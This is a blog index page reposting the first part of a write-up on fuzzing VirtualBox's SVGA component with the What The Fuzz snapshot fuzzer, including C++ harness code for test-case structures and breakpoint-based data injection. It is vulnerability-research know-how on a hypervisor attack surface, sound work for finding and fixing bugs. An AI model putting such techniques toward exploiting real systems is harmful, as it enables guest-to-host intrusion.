<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"usmacd.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="安全代码">
<meta property="og:url" content="http://usmacd.com/page/8/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="henices">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://usmacd.com/page/8/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/8/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>安全代码</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">安全代码</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="henices"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">henices</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">102</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://twitter.com/henices" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;henices" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="rss fa-fw"></i>RSS</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="http://scz.617.cn:8/" title="http:&#x2F;&#x2F;scz.617.cn:8&#x2F;" rel="noopener" target="_blank">飞花堂</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com&#x2F;" rel="noopener" target="_blank">V2EX</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://blog.forecho.com/" title="https:&#x2F;&#x2F;blog.forecho.com&#x2F;" rel="noopener" target="_blank">forecho</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://www.mrhuangtalk.com/" title="https:&#x2F;&#x2F;www.mrhuangtalk.com&#x2F;" rel="noopener" target="_blank">Mr.Huang talk</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://demochen.com/" title="https:&#x2F;&#x2F;demochen.com&#x2F;" rel="noopener" target="_blank">DemoChen</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/" class="post-title-link" itemprop="url">When Hypervisor Met Snapshot Fuzzing</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-21 16:00:00" itemprop="dateCreated datePublished" datetime="2022-07-21T16:00:00+08:00">2022-07-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>source: <a target="_blank" rel="noopener" href="https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html">https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html</a></p>
<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( <a target="_blank" rel="noopener" href="https://rezer0dai.github.io/biug-bounties/">Peter Hlavaty</a>, <a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf">Chaitin Tech</a>, <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/#coverage-guided-fuzzing">StarLabs</a>, <a target="_blank" rel="noopener" href="https://github.com/SafeBreach-Labs/hAFL2">Peleg Hadar and Ophir Harpaz</a> and many others ) doing amazing work to overcome this limit and found interesting bugs.</p>
<p>But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without <strong>What The Fuzz</strong>.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf">What The Fuzz</a>( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTF’s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/bochscpu_backend.cc#L265">breakpoint Handler</a> which you can set breakpoint on <strong>any</strong> address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fshooks.cc">file access</a>.</p>
<p>I really love WTF’s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is.</p>
<h1 id="2-Developing-Fuzz-Module"><a href="#2-Developing-Fuzz-Module" class="headerlink" title="2. Developing Fuzz Module"></a>2. Developing Fuzz Module</h1><p>First, you should define your own fuzz module for your target. There are few examples on github( <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">fuzzer_hevd.cc</a>, <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">fuzzer_tlv_server.cc</a> ) and blog post( <a target="_blank" rel="noopener" href="https://blog.ret2.io/2021/07/21/wtf-snapshot-fuzzing/">ret2systems</a>, <a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">Doar-e</a> ). </p>
<p>My Target was Virtualbox’s <strong>SVGA</strong> component.</p>
<p>SVGA is something like “<a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2021/1/6/mindshare-analysis-of-vmware-workstation-and-esxi-using-debug-symbols-from-flings">JavaScript of hypervisors</a>“. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And that’s the reason why I choose it as a first target.</p>
<p>VirtualBox have a function called <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4505">vmsvgaR3FifoLoop</a>. It <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4757">waits</a> until guest submit new command data through GPA. So this is a good spot( or should I call it <a target="_blank" rel="noopener" href="https://youtu.be/ZaOtY4i5w_U">source</a>? ) to take a snapshot.</p>
<p>I set a breakpoint on <code>vmsvgaR3FifoLoop+4E2</code> to take snapshot. It is same position as <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4783">here</a>, start of switch-case routine for <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Devices/Graphics/vmsvga_include/svga_reg.h#L152">SVGA</a> and <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Additions/3D/mesa/mesa-17.3.9/src/gallium/drivers/svga/include/svga3d_cmd.h#L56">SVGA3D</a> command.</p>
<p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah1.png" alt="blahblah1"></p>
<p>After creating snapshot, I had to decide make it <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">run multiple times in single execution</a> or <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">not</a>. Because SVGA is consist of various commands like define, update, delete something…, I thought fuzz campaign must handle multiple SVGA commands during single round.</p>
<p>First, I had to define structure to contains multiple testcases. Luckily, <a target="_blank" rel="noopener" href="https://twitter.com/0vercl0k">0vercl0k</a> already write <a target="_blank" rel="noopener" href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/fuzzer_tlv_server.cc#L24-L75">nice example</a> to doing that. So I did same thing as below.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SVGA_CMD_BODY_MAX 0xA000</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdList[] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">1040</span>, <span class="number">1041</span>, <span class="number">1042</span>, <span class="number">1043</span>, <span class="number">1044</span>, <span class="number">1046</span>, <span class="number">1047</span>, <span class="number">1048</span>, <span class="number">1049</span>, <span class="number">1050</span>, <span class="number">1051</span>, <span class="number">1052</span>, <span class="number">1053</span>, <span class="number">1054</span>, <span class="number">1055</span>, <span class="number">1056</span>, <span class="number">1057</span>, <span class="number">1058</span>, <span class="number">1059</span>, <span class="number">1060</span>, <span class="number">1061</span>, <span class="number">1062</span>, <span class="number">1063</span>, <span class="number">1064</span>, <span class="number">1065</span>, <span class="number">1066</span>, <span class="number">1067</span>, <span class="number">1068</span>, <span class="number">1069</span>, <span class="number">1070</span>, <span class="number">1071</span>, <span class="number">1072</span>, <span class="number">1073</span>, <span class="number">1074</span>, <span class="number">1075</span>, <span class="number">1076</span>, <span class="number">1077</span>, <span class="number">1078</span>, <span class="number">1079</span>, <span class="number">1080</span>, <span class="number">1081</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> SvgaCmdListLen = <span class="number">58</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmd_t</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdCode;</span><br><span class="line">  std::vector&lt;<span class="type">uint8_t</span>&gt; SvgaBody;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmd_t, SvgaCmdCode, SvgaBody);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SvgaCmds_t</span> &#123;</span><br><span class="line">  std::vector&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  <span class="built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmds_t, SvgaCmds);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  std::deque&lt;SvgaCmd_t&gt; SvgaCmds;</span><br><span class="line">  CpuState_t Context;</span><br><span class="line">  <span class="type">uint8_t</span> SvgaCmdBody[SVGA_CMD_BODY_MAX];</span><br><span class="line">  <span class="type">uint32_t</span> SvgaCmdBodySize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">RestoreGprs</span><span class="params">(Backend_t *B)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;C = Context;</span><br><span class="line">    B-&gt;<span class="built_in">Rsp</span>(C.Rsp);</span><br><span class="line">    B-&gt;<span class="built_in">Rip</span>(C.Rip);</span><br><span class="line">    B-&gt;<span class="built_in">Rax</span>(C.Rax);</span><br><span class="line">    B-&gt;<span class="built_in">Rbx</span>(C.Rbx);</span><br><span class="line">    B-&gt;<span class="built_in">Rcx</span>(C.Rcx);</span><br><span class="line">    B-&gt;<span class="built_in">Rdx</span>(C.Rdx);</span><br><span class="line">    B-&gt;<span class="built_in">Rsi</span>(C.Rsi);</span><br><span class="line">    B-&gt;<span class="built_in">Rdi</span>(C.Rdi);</span><br><span class="line">    B-&gt;<span class="built_in">R8</span>(C.R8);</span><br><span class="line">    B-&gt;<span class="built_in">R9</span>(C.R9);</span><br><span class="line">    B-&gt;<span class="built_in">R10</span>(C.R10);</span><br><span class="line">    B-&gt;<span class="built_in">R11</span>(C.R11);</span><br><span class="line">    B-&gt;<span class="built_in">R12</span>(C.R12);</span><br><span class="line">    B-&gt;<span class="built_in">R13</span>(C.R13);</span><br><span class="line">    B-&gt;<span class="built_in">R14</span>(C.R14);</span><br><span class="line">    B-&gt;<span class="built_in">R15</span>(C.R15);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; GlobalState;</span><br><span class="line"></span><br><span class="line"><span class="function">SvgaCmds_t <span class="title">Deserialize</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = json::json::<span class="built_in">parse</span>(Buffer, Buffer + BufferSize);</span><br><span class="line">  <span class="keyword">return</span> Root.<span class="built_in">get</span>&lt;SvgaCmds_t&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InsertTestcase</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Buffer, <span class="type">const</span> <span class="type">size_t</span> BufferSize)</span> </span>&#123;</span><br><span class="line">  GlobalState.SvgaCmds.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">auto</span> &amp;Root = <span class="built_in">Deserialize</span>(Buffer, BufferSize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> SvgaCmd : Root.SvgaCmds) &#123;</span><br><span class="line">    GlobalState.SvgaCmds.<span class="built_in">emplace_back</span>(std::<span class="built_in">move</span>(SvgaCmd));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It is almost identical as example.</p>
<p>Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called <a target="_blank" rel="noopener" href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4183">vmsvgaR3FifoGetCmdPayload</a> to receive command data from guest to host. I define a breakpoint handler in <code>Init()</code> callback function as below.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(</span></span><br><span class="line"><span class="comment">//       unsigned int cbPayloadReq,</span></span><br><span class="line"><span class="comment">//       volatile unsigned int *pFIFO,</span></span><br><span class="line"><span class="comment">//       unsigned int offCurrentCmd,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMin,</span></span><br><span class="line"><span class="comment">//       unsigned int offFifoMax,</span></span><br><span class="line"><span class="comment">//       unsigned __int8 *pbBounceBuf,</span></span><br><span class="line"><span class="comment">//       unsigned int *pcbAlreadyRead,</span></span><br><span class="line"><span class="comment">//       PDMTHREAD *pThread,</span></span><br><span class="line"><span class="comment">//       VGAState *pThis,</span></span><br><span class="line"><span class="comment">//       VMSVGAR3STATE *pSVGAState,</span></span><br><span class="line"><span class="comment">//       PDMDEVINSR3 *pDevIns)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;</span>, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="type">uint32_t</span> cbPayloadReq = Backend-&gt;<span class="built_in">GetArg</span>(<span class="number">0</span>);</span><br><span class="line">  Gva_t pbBounceBuf_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">5</span>);</span><br><span class="line">  Gva_t pcbAlreadyRead_gva = Backend-&gt;<span class="built_in">GetArgGva</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) &#123;</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;cbpayloadReq(&#123;:#x&#125;) &gt; SvgaCmdBodySize(&#123;:#x&#125;), restore context and goto next round\n&quot;</span>, cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    <span class="keyword">return</span> GlobalState.<span class="built_in">RestoreGprs</span>(Backend);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(cbPayloadReq &gt; u32PbBounceBufMaxSize) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> RetAddr = Backend-&gt;<span class="built_in">VirtRead8</span>(<span class="built_in">Gva_t</span>(Backend-&gt;<span class="built_in">Rsp</span>()));</span><br><span class="line">    <span class="built_in">DebugPrint</span>(<span class="string">&quot;check this, RetAddr = &#123;:#x&#125;\n&quot;</span>, RetAddr);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteDirty</span>(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to write pbBounceBuf, pbBounceBuf = &#123;:#x&#125;, cbPayloadReq = &#123;:#x&#125;, SvgaCmdBodySize = &#123;:#x&#125;\n&quot;</span>,</span><br><span class="line">                pbBounceBuf_gva.<span class="built_in">U64</span>(), cbPayloadReq, GlobalState.SvgaCmdBodySize);</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!Backend-&gt;<span class="built_in">VirtWriteStructDirty</span>(pcbAlreadyRead_gva, &amp;cbPayloadReq)) &#123;</span><br><span class="line">    fmt::<span class="built_in">print</span>(<span class="string">&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = &#123;:#x&#125;\n&quot;</span>, pcbAlreadyRead_gva.<span class="built_in">U64</span>());</span><br><span class="line">    std::<span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Backend-&gt;<span class="built_in">SimulateReturnFromFunction</span>(pbBounceBuf_gva.<span class="built_in">U64</span>());</span><br><span class="line"></span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I also had to define end point of execution. After some reversing, I found two spots and using it as end point.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Gva_t SvgaLoopEnd = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24AB</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgaLoopEnd, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgaLoopEnd\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> Gva_t SvgLoopEnd2 = <span class="built_in">Gva_t</span>(g_Dbg.<span class="built_in">GetSymbol</span>(<span class="string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="number">0x24B2</span>);</span><br><span class="line"><span class="keyword">if</span>(!g_Backend-&gt;<span class="built_in">Setbreakpoint</span>(SvgLoopEnd2, [](Backend_t *Backend) &#123;</span><br><span class="line">  <span class="built_in">DebugPrint</span>(<span class="string">&quot;loop end2 reached, restore context\n&quot;</span>);</span><br><span class="line">  GlobalState.<span class="built_in">RestoreGprs</span>(g_Backend);</span><br><span class="line">&#125;)) &#123;</span><br><span class="line">  fmt::<span class="built_in">print</span>(<span class="string">&quot;Failed to Setbreakpoint on SvgLoopEnd2\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As I said above, I create a snapshot on <code>vmsvgaR3FifoLoop+4E2</code>. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler.</p>
